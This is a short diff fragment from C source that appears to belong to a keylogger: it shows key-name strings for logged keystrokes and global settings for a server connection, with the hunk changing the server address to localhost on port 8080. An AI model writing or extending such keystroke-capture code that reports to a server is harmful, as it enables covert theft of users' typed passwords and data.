@@ -24,7 +24,7 @@ char vkeys_str[][20] = {"[BACKSPACE]","\n","_","[TAB]","[SHIFT]","[LSHIFT]","[RS
 
 
 // global variales used to connect with server
-char *ip = "192.168.1.124";
+char *ip = "127.0.0.1";
 int port = 8080;
 SOCKET client;
 
